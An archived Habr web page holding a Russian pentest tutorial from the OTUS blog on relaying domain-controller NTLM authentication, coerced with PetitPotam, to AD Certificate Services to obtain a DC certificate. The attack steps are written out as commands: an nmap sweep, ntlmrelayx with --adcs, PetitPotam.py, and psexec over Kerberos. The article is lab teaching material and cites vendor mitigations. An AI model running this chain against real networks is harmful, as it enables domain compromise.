@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="ru" data-vue-meta="%7B%22lang%22:%7B%22ssr%22:%22ru%22%7D%7D">
+<head >
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+  <title>Практика использования Relay+PetitPotam / Хабр</title>
+  <style>
+    /* cyrillic-ext */
+    @font-face {
+      font-family: 'Fira Sans';
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(https://fonts.gstatic.com/s/firasans/v11/va9B4kDNxMZdWfMOD5VnZKveSxf6TF0.woff2) format('woff2');
+      unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+    }
+
+    /* cyrillic */
+    @font-face {
+      font-family: 'Fira Sans';
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(https://fonts.gstatic.com/s/firasans/v11/va9B4kDNxMZdWfMOD5VnZKveQhf6TF0.woff2) format('woff2');
+      unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+    }
+
+    /* latin-ext */
+    @font-face {
+      font-family: 'Fira Sans';
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(https://fonts.gstatic.com/s/firasans/v11/va9B4kDNxMZdWfMOD5VnZKveSBf6TF0.woff2) format('woff2');
+      unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+    }
+
+    /* latin */
+    @font-face {
+      font-family: 'Fira Sans';
+      font-style: normal;
+      font-weight: 500;
+      font-display: swap;
+      src: url(https://fonts.gstatic.com/s/firasans/v11/va9B4kDNxMZdWfMOD5VnZKveRhf6.woff2) format('woff2');
+      unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+    }
+  </style>
+  <link rel="preload" href="https://assets.habr.com/habr-web/css/chunk-vendors.e7843cc0.css" as="style"><link rel="preload" href="https://assets.habr.com/habr-web/js/chunk-vendors.c2c3fc9a.js" as="script"><link rel="preload" href="https://assets.habr.com/habr-web/css/app.02ee25a4.css" as="style"><link rel="preload" href="https://assets.habr.com/habr-web/js/app.c0af73e7.js" as="script">
+  <link rel="stylesheet" href="https://assets.habr.com/habr-web/css/chunk-vendors.e7843cc0.css"><link rel="stylesheet" href="https://assets.habr.com/habr-web/css/app.02ee25a4.css">
+  <script>window.i18nFetch = new Promise((res, rej) => {
+          const xhr = new XMLHttpRequest();
+          xhr.open('GET', '/js/i18n/ru-compiled.85eb77f0b17c8235e7b64b9f81ea5ec2.json');
+          xhr.responseType = 'json';
+          xhr.onload = function(e) {
+            if (this.status === 200) {
+              res({ru: xhr.response});
+            } else {
+              rej(e);
+            }
+          };
+          xhr.send();
+        });</script>
+  
+  <script data-vue-meta="ssr" src="/js/ads.js" onload="window['zhY4i4nJ9K'] = true" data-vmid="checkad"></script><script data-vue-meta="ssr" type="application/ld+json" data-vmid="ldjson-schema">{"@context":"http:\/\/schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/habr.com\/ru\/company\/otus\/blog\/583496\/"},"headline":"Практика использования Relay+PetitPotam","datePublished":"2021-10-14T17:55:37+03:00","dateModified":"2021-10-14T20:38:01+03:00","author":{"@type":"Person","name":"Ксения Мосеенкова"},"publisher":{"@type":"Organization","name":"Habr","logo":{"@type":"ImageObject","url":"https:\/\/habrastorage.org\/webt\/a_\/lk\/9m\/a_lk9mjkccjox-zccjrpfolmkmq.png"}},"description":"Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclame...","url":"https:\/\/habr.com\/ru\/company\/otus\/blog\/583496\/#post-content-body","about":["c_otus","h_infosecurity","f_develop"],"image":["https:\/\/habr.com\/share\/publication\/583496\/2c3a9ed28530c8d47005451106673a9b\/","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/6d3\/544\/aeb\/6d3544aebb54f70f40be8065de5b8384.png","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/551\/4ec\/f2b\/5514ecf2bd8b46247e40113f318f71fe.PNG","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/bca\/2bf\/a17\/bca2bfa176a5e71d6fc0d710c195784e.PNG","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/403\/55c\/3df\/40355c3dfe0c2707cd01efce80c7de10.PNG","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/d22\/6b4\/292\/d226b4292bc3b2dc4d065d146c4689bf.PNG","https:\/\/habrastorage.org\/getpro\/habr\/upload_files\/00c\/bc0\/d71\/00cbc0d71b5280cacbfc53a63dd8cda5.PNG"]}</script>
+  <script src="//www.googletagservices.com/tag/js/gpt.js" async></script>
+  <style>.grecaptcha-badge{visibility: hidden;}</style>
+  <meta name="habr-version" content="2.49.0">
+  
+  <meta data-vue-meta="ssr" property="fb:app_id" content="444736788986613"><meta data-vue-meta="ssr" property="fb:pages" content="472597926099084"><meta data-vue-meta="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-meta="ssr" name="twitter:site" content="@habr_eng"><meta data-vue-meta="ssr" property="og:title" content="Практика использования Relay+PetitPotam" data-vmid="og:title"><meta data-vue-meta="ssr" name="twitter:title" content="Практика использования Relay+PetitPotam" data-vmid="twitter:title"><meta data-vue-meta="ssr" name="aiturec:title" content="Практика использования Relay+PetitPotam" data-vmid="aiturec:title"><meta data-vue-meta="ssr" name="description" content="Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но..." data-vmid="description"><meta data-vue-meta="ssr" itemprop="description" content="Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но..." data-vmid="description:itemprop"><meta data-vue-meta="ssr" property="og:description" content="Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но..." data-vmid="og:description"><meta data-vue-meta="ssr" name="twitter:description" content="Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но..." data-vmid="twitter:description"><meta data-vue-meta="ssr" property="aiturec:description" content="Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой Disclamer: статья не претендует на полноту, но..." data-vmid="aiturec:description"><meta data-vue-meta="ssr" itemprop="image" content="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="image:itemprop"><meta data-vue-meta="ssr" property="og:image" content="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="og:image"><meta data-vue-meta="ssr" property="aiturec:image" content="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="aiturec:image"><meta data-vue-meta="ssr" name="twitter:image" content="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="twitter:image"><meta data-vue-meta="ssr" property="vk:image" content="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="vk:image"><meta data-vue-meta="ssr" property="aiturec:item_id" content="583496" data-vmid="aiturec:item_id"><meta data-vue-meta="ssr" property="aiturec:datetime" content="2021-10-14T14:55:37.000Z" data-vmid="aiturec:datetime"><meta data-vue-meta="ssr" property="og:type" content="article" data-vmid="og:type"><meta data-vue-meta="ssr" property="og:locale" content="ru_RU" data-vmid="og:locale"><meta data-vue-meta="ssr" property="og:image:width" content="1200" data-vmid="og:image:width"><meta data-vue-meta="ssr" property="og:image:height" content="630" data-vmid="og:image:height">
+  <link data-vue-meta="ssr" href="https://habr.com/ru/rss/post/583496/?fl=ru" type="application/rss+xml" title="" rel="alternate" name="rss"><link data-vue-meta="ssr" href="https://habr.com/ru/company/otus/blog/583496/" rel="canonical" data-vmid="canonical"><link data-vue-meta="ssr" data-vmid="hreflang"><link data-vue-meta="ssr" image_src="image" href="https://habrastorage.org/getpro/habr/upload_files/3fc/994/d0c/3fc994d0cbdab6a42f905fba1fc09396.png" data-vmid="image:href"><link data-vue-meta="ssr" rel="amphtml" href="https://habr.com/ru/amp/post/583496/">
+  <meta name="apple-mobile-web-app-status-bar-style" content="#303b44">
+  <meta name="msapplication-TileColor" content="#629FBC">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <link
+    rel="shortcut icon"
+    type="image/png"
+    sizes="16x16"
+    href="https://assets.habr.com/habr-web/img/favicons/favicon-16.png"
+  >
+  <link
+    rel="shortcut icon"
+    type="image/png"
+    sizes="32x32"
+    href="https://assets.habr.com/habr-web/img/favicons/favicon-32.png"
+  >
+  <link
+    rel="apple-touch-icon"
+    type="image/png"
+    sizes="76x76"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-76.png"
+  >
+  <link
+    rel="apple-touch-icon"
+    type="image/png"
+    sizes="120x120"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-120.png"
+  >
+  <link
+    rel="apple-touch-icon"
+    type="image/png"
+    sizes="152x152"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-152.png"
+  >
+  <link
+    rel="apple-touch-icon"
+    type="image/png"
+    sizes="180x180"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-180.png"
+  >
+  <link
+    rel="apple-touch-icon"
+    type="image/png"
+    sizes="256x256"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-256.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1136x640.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2436x1125.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1792x828.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_828x1792.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1334x750.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1242x2668.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2208x1242.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1125x2436.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1242x2208.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2732x2048.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2688x1242.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2224x1668.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_750x1334.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2048x2732.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2388x1668.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1668x2224.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_640x1136.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1668x2388.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: landscape)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_2048x1536.png"
+  >
+  <link
+    rel="apple-touch-startup-image"
+    media="screen and (device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"
+    href="https://assets.habr.com/habr-web/img/splashes/splash_1536x2048.png"
+  >
+  <link
+    rel="mask-icon"
+    color="#77a2b6"
+    href="https://assets.habr.com/habr-web/img/favicons/apple-touch-icon-120.svg"
+  >
+  <link
+    crossorigin="use-credentials"
+    href="/manifest.webmanifest"
+    rel="manifest"
+  >
+</head>
+<body>
+
+
+<div id="app" data-server-rendered="true" data-async-called="true"><div class="tm-layout__wrapper"><!----> <div></div> <!----> <header class="tm-header"><div class="tm-page-width"><div class="tm-header__container"><!----> <span class="tm-header__logo-wrap"><a href="/ru/" class="tm-header__logo tm-header__logo_ru"><svg height="16" width="16" class="tm-svg-img tm-header__icon"><title>Хабр</title> <use xlink:href="/img/habr-logo-ru.svg#logo"></use></svg></a> <span class="tm-header__beta-sign" style="display:none;">β</span></span> <div class="tm-dropdown tm-header__projects"><div class="tm-dropdown__head"><button class="tm-header__dropdown-toggle"><svg height="16" width="16" class="tm-svg-img tm-header__icon tm-header__icon_dropdown"><title>Открыть список</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#arrow-down"></use></svg></button></div> <!----></div> <a href="/ru/sandbox/start/" class="tm-header__become-author-btn">
+            Как стать автором
+          </a> <div class="tm-feature tm-header__feature tm-feature_variant-inline"><!----></div> <!----> <!----></div></div></header> <div class="tm-layout"><div class="tm-page-progress-bar"></div> <div data-menu-sticky="true" class="tm-base-layout__header tm-base-layout__header_is-sticky"><div class="tm-page-width"><div class="tm-base-layout__header-wrapper"><div class="tm-main-menu"><div class="tm-main-menu__section"><nav class="tm-main-menu__section-content"><!----> <a href="/ru/all/" class="tm-main-menu__item">
+        Все потоки
+      </a> <a href="/ru/flows/develop/" class="tm-main-menu__item">
+          Разработка
+        </a><a href="/ru/flows/admin/" class="tm-main-menu__item">
+          Администрирование
+        </a><a href="/ru/flows/design/" class="tm-main-menu__item">
+          Дизайн
+        </a><a href="/ru/flows/management/" class="tm-main-menu__item">
+          Менеджмент
+        </a><a href="/ru/flows/marketing/" class="tm-main-menu__item">
+          Маркетинг
+        </a><a href="/ru/flows/popsci/" class="tm-main-menu__item">
+          Научпоп
+        </a></nav></div></div> <div class="tm-header-user-menu tm-base-layout__user-menu"><a href="/ru/search/" class="tm-header-user-menu__item tm-header-user-menu__search"><svg height="24" width="24" class="tm-svg-img tm-header-user-menu__icon tm-header-user-menu__icon_search tm-header-user-menu__icon_dark"><title>Поиск</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#search"></use></svg></a> <!----> <!----> <!----> <div class="tm-header-user-menu__item tm-header-user-menu__user_desktop"><div class="tm-dropdown"><div class="tm-dropdown__head"><svg height="24" width="24" data-test-id="menu-toggle-guest" class="tm-svg-img tm-header-user-menu__icon"><title>Профиль</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#header-user"></use></svg> <!----></div> <!----></div> <!----></div> <!----></div></div></div></div> <!----> <div class="tm-page-width"></div> <main class="tm-layout__container"><div hl="ru" companyName="otus" data-async-called="true" class="tm-page"><div class="tm-page-width"><div class="tm-page__header"><!----></div> <div class="tm-page__wrapper"><div class="tm-page__main tm-page__main_has-sidebar"><div class="pull-down"><div class="pull-down__header" style="height:0px;"><div class="pull-down__content" style="bottom:10px;"><svg height="24" width="24" class="tm-svg-img pull-down__arrow"><title>Обновить</title> <use xlink:href="/img/megazord-v24.ce74655c.svg#pull-arrow"></use></svg></div></div> <div class="tm-article-presenter"><div class="tm-company-card tm-company-article__company-card"><div class="tm-company-card__info"><div class="tm-company-card__header"><a href="/ru/company/otus/profile/" class="tm-company-card__avatar"><div class="tm-entity-image"><img alt="" height="48" src="//habrastorage.org/getpro/habr/company/968/422/761/968422761136a38a89fc391fd927f903.jpg" width="48" class="tm-entity-image__pic"></div></a> <!----> <div class="tm-rating tm-company-card__rating"><div class="tm-rating__header"> <div class="tm-rating__counter">404.8</div></div> <div class="tm-rating__text">
+    Рейтинг
+  </div></div></div> <div class="tm-company-card__info"><a href="/ru/company/otus/profile/" class="tm-company-card__name">
+        OTUS
+      </a> <div class="tm-company-card__description">Цифровые навыки от ведущих экспертов</div></div></div> <div class="tm-company-card__buttons"><!----> <!----></div></div> <div class="tm-article-presenter__body"><div class="tm-misprint-area"><div class="tm-misprint-area__wrapper"><article class="tm-article-presenter__content tm-article-presenter__content_narrow"><div class="tm-article-presenter__header"> <div class="tm-article-snippet tm-article-presenter__snippet"><div class="tm-article-snippet__meta-container"><div class="tm-article-snippet__meta"><span class="tm-user-info tm-article-snippet__author"><a href="/ru/users/kmoseenk/" title="kmoseenk" class="tm-user-info__userpic"><div class="tm-entity-image"><img alt="" height="24" loading="lazy" src="//habrastorage.org/r/w32/getpro/habr/avatars/9c1/f26/fc3/9c1f26fc3a6df952b80365d8dd4a1642.png" width="24" class="tm-entity-image__pic"></div></a> <span class="tm-user-info__user"><a href="/ru/users/kmoseenk/" class="tm-user-info__username">
+      kmoseenk
+    </a> </span></span> <span class="tm-article-snippet__datetime-published"><time datetime="2021-10-14T14:55:37.000Z" title="2021-10-14, 17:55">14  октября   в 17:55</time></span></div> <!----></div> <h1 lang="ru" class="tm-article-snippet__title tm-article-snippet__title_h1"><span>Практика использования Relay+PetitPotam</span></h1> <div class="tm-article-snippet__hubs"><span class="tm-article-snippet__hubs-item"><a href="/ru/company/otus/blog/" class="tm-article-snippet__hubs-item-link router-link-active"><span>Блог компании OTUS</span> <!----></a></span><span class="tm-article-snippet__hubs-item"><a href="/ru/hub/infosecurity/" class="tm-article-snippet__hubs-item-link"><span>Информационная безопасность</span> <span title="Профильный хаб" class="tm-article-snippet__profiled-hub">*</span></a></span></div> <!----> <!----> <!----></div></div> <!----> <div data-gallery-root="" lang="ru" class="tm-article-body"><div id="post-content-body" class="article-formatted-body article-formatted-body_version-2"><div xmlns="http://www.w3.org/1999/xhtml"><figure class="full-width "><img src="/img/image-loader.svg" height="439" data-src="https://habrastorage.org/getpro/habr/upload_files/6d3/544/aeb/6d3544aebb54f70f40be8065de5b8384.png" data-width="780"/><figcaption></figcaption></figure><p>Статья расскажет о вариации нового метода атаки на инфраструктуру. Рассмотрим основные инструменты, подготовим тестовый стенд и проведем тест. Небольшой <em>Disclamer</em>: статья не претендует на полноту, но является примером того, как можно собрать полезную информацию и проверить работоспособность инструментов перед их использованием.</p><h4>Что это и как используется</h4><p>Классический пример атак типа MiTM. То есть это атаки, которые сегодня возможны, по большей части только в локальных сетях. Данный вариант атак заключается в том, что атакующий может перехватить полностью или частично данные между двумя хостами в сети и переотправить их одному из участников соединения, как правило серверу. Переотправка может включать дополнительные изменения данных, но как правило, это воздействие может быть невозможно, в силу используемых механизмов защит, либо из-за особенностей работы системы, на которую производится атака.</p><p><strong>Что такое PetitPotam?</strong> Самое сложное для проведения атаки типа Relay — это перехват данных, которые используются для настройки соединения. Зачастую, чтобы этот момент был 100% обнаружен в момент исследования сети можно:</p><ol><li><p>Использовать атаки типа ARP Poison и пользователь рано или поздно обратиться к атакующему серверу</p></li><li><p>Использовать механизмы, которые принудительно заставят операционную систему начать процедуру настройки соединения.</p></li></ol><p>Ко второму типу уловок как раз и относится <code>PetitPotam</code>. В случае конкретно этого подхода используется MS-EFSRPC протокол, который используется для вызова функции <code>EfsRpcOpenFileRaw</code>. Вызов этой функции запустит процесс аутентификации. Наибольшую популярность метод получил в совокупности с атакой <a href="https://github.com/bats3c/ADCSPwn">ADCSPwn</a>.</p><h4>AD CS атака</h4><p>Недавнее <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">исследование</a> команды SpecterOps показало, что стандартные роли сервера для сертификатов Windows AD. Не настолько безопасны, как может показаться на первый взгляд. Согласно данным исследования, если атакующий найдет способ, как заставить контроллер домена обратиться к хосту, который поддерживает NTLM аутентификацию, то атакующий сможет заполучить сертификат для учетной записи контроллера домена. Это фактически означает, что атакующий может представляться для любых сервисов инфраструктуры контроллером домена со всеми вытекающими последствиями.</p><p>На данный момент концепцию атаки используют в совокупности с методом <code>PetitPotam</code>. Попробуем проверить насколько это возможно.</p><h4>Настройка стенда для тестирования</h4><p>Стенд будет состоять из 3 машин:</p><ul><li><p>Windows Server 2019 &lt;- котроллер домена</p></li><li><p>Windows Server 2019 &lt;- сервер c ролью сертификационного центра</p></li><li><p>Windows 10 &lt;- клиентская машина</p></li><li><p>Kali linux &lt;- машина атакующего</p></li></ul><p>Чтобы настроить сервер для лабораторной, можно использовать любую систему виртуализации. Затем необходимо настроить обычный домен, делается это просто через интерфейс управления сервером. Единственная особенность, которую нужно учесть при установке — добавить роль сертификационного центра. Располагается эта опция в английской локали установщика, в функции "WebDav Redirector". После того как установили сервера, можно начинать тестирование атаки. Для проведения теста нам понадобится следующий набор инструментов:</p><ul><li><p><a href="https://github.com/SecureAuthCorp/impacket">impacket</a></p></li><li><p><a href="https://github.com/topotam/PetitPotam">PetitPotam.py</a></p></li><li><p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCChache</a></p></li></ul><p>Вообще к этому набору можно добавить инструменты из списка ниже:</p><ul><li><p><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p></li><li><p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p></li></ul><p>Однако, чтобы использовать эти инструменты, нужно проводить тестирование именно с Windows машины. Попробуем обойтись без них.</p><h4>Тестирование</h4><p>Сеть находится в следующем диапазоне: 192.168.47.1/24 найдем  все активные машины в сети и обнаружим сертификационный сервер и контроллер домена:</p><pre><code>nmap -n -sn 192.168.47.1/24</code></pre><figure class=""><img src="https://habrastorage.org/getpro/habr/upload_files/551/4ec/f2b/5514ecf2bd8b46247e40113f318f71fe.PNG" width="606" height="197"/><figcaption></figcaption></figure><pre><code>curl -v http://192.168.47.144/certsrv/</code></pre><figure class=""><img src="https://habrastorage.org/getpro/habr/upload_files/bca/2bf/a17/bca2bfa176a5e71d6fc0d710c195784e.PNG" width="936" height="345"/><figcaption></figcaption></figure><p>Если сервер вернет код 301, значит один из серверов является сертификационным центром. Данный метод лишь небольшая уловка, которую можно применять на ряду с остальными методами исследования сети. Можно так же полагаться на набор сервисов, которые покажет nmap, а можно прибегнуть к поиску данных через DCOM или SMB.</p><p>Можно переходить к атаке. Запустим ntlmrelayx.py</p><pre><code class="python">python3 ntlmrelayx.py -t http://192.168.47.144/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></pre><figure class=""><img src="https://habrastorage.org/getpro/habr/upload_files/403/55c/3df/40355c3dfe0c2707cd01efce80c7de10.PNG" width="1084" height="370"/><figcaption></figcaption></figure><p>Заставим контроллер домена инициировать процедуру аутентификации и получим сертификат:</p><pre><code class="python">python3 PetitPotam.py 192.168.1.111 192.168.47.144</code></pre><figure class=""><img src="https://habrastorage.org/getpro/habr/upload_files/d22/6b4/292/d226b4292bc3b2dc4d065d146c4689bf.PNG" width="851" height="456"/><figcaption></figcaption></figure><p>Как видно из вывода инструмента, мы смогли заставить контроллер домена обратиться к сертификационному центру. Теперь дело за малым, нужно перехватить данные. ntlmrelayx сделал всю необходимую работу:</p><figure class=""><img src="https://habrastorage.org/getpro/habr/upload_files/00c/bc0/d71/00cbc0d71b5280cacbfc53a63dd8cda5.PNG" width="1084" height="370"/><figcaption></figcaption></figure><p>Полученный сертификат идеально подходит сейчас под использование с инструментом Rubeus, но мы будем использовать дальше Kali Linux. Для того чтобы это было возможно, мы создадим файл ".ccache" именно этот файл может быть использован для работы с Kerberos.</p><p>Попробуем подключиться к контроллеру домена и выполнить команды:</p><pre><code class="bash">export KRB5CCNAME=
+python3 psexec.py /@ -k -no-pass</code></pre><p>Таким образом, мы успешно провели атаку на уязвимом стенде. Данный набор инструментов может быть использован для дальнейшего выполнения команд в инфраструктуре Windows AD. Для защиты от подобной атаки можно использовать <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429">рекомендации</a> от вендора. И также можно поискать еще дополнительные распространенные ошибки конфигурации сертификационных серверов с помощью вот <a href="https://github.com/GhostPack/PSPKIAudit">этого</a> инструмента.</p><hr/><blockquote><p>Статья подготовлена Александром Колесниковым <em>(вирусный аналитик, преподаватель в OTUS)</em> в рамках <a href="https://otus.pw/fMI1/">курса «Пентест. Практика тестирования на проникновение».</a><br/><br/>Предлагаем посмотреть <a href="https://otus.pw/PzXm/"><strong>запись demo-урока</strong></a> курса по теме «Bloodhound. Сбор данных об Windows AD». На занятии участники вместе с преподавателем познакомились с инструментами для исследования AD, а полученные данные использовали для повышения привилегий и продвижения в сети.</p></blockquote></div></div> <!----> <!----></div> <div class="tm-article-presenter__meta"><div class="tm-separated-list tm-article-presenter__meta-list"><span class="tm-separated-list__title">Теги:</span> <ul class="tm-separated-list__list"><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5B%D0%BF%D0%B5%D0%BD%D1%82%D0%B5%D1%81%D1%82%5D" class="tm-tags-list__link">пентест</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5Bpentest%5D" class="tm-tags-list__link">pentest</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5B%D1%82%D0%B5%D1%81%D1%82%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%20%D0%BD%D0%B0%20%D0%BF%D1%80%D0%BE%D0%BD%D0%B8%D0%BA%D0%BD%D0%BE%D0%B2%D0%B5%D0%BD%D0%B8%D0%B5%5D" class="tm-tags-list__link">тестирование на проникновение</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5Bpetitpotam%5D" class="tm-tags-list__link">petitpotam</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5BRelay%2BPetitPotam%5D" class="tm-tags-list__link">Relay+PetitPotam</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5B%D0%B0%D1%82%D0%B0%D0%BA%D0%B0%20%D0%BD%D0%B0%20%D0%B8%D0%BD%D1%84%D1%80%D0%B0%D1%81%D1%82%D1%80%D1%83%D0%BA%D1%82%D1%83%D1%80%D1%83%5D" class="tm-tags-list__link">атака на инфраструктуру</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5Bbloodhound%5D" class="tm-tags-list__link">bloodhound</a></li><li class="tm-separated-list__item"><a href="/ru/search/?target_type=posts&amp;order=relevance&amp;q=%5B%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C%5D" class="tm-tags-list__link">безопасность</a></li></ul></div> <div 